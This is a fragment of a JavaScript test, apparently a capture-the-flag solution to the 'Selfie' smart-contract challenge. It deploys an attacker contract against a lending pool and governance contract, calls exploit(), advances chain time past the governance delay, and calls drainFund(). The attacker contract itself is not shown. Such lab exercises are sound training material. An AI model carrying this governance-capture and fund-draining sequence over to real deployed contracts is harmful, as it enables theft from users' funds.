...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    this.attackerContract = await SelfieAttacker.connect(attacker).deploy(
      this.pool.address,
      this.governance.address
    );

    await this.attackerContract.exploit();
    const actionDelay = await this.governance.getActionDelay();
    await ethers.provider.send("evm_increaseTime", [actionDelay.toNumber()]);
    await this.attackerContract.drainFund();
  });
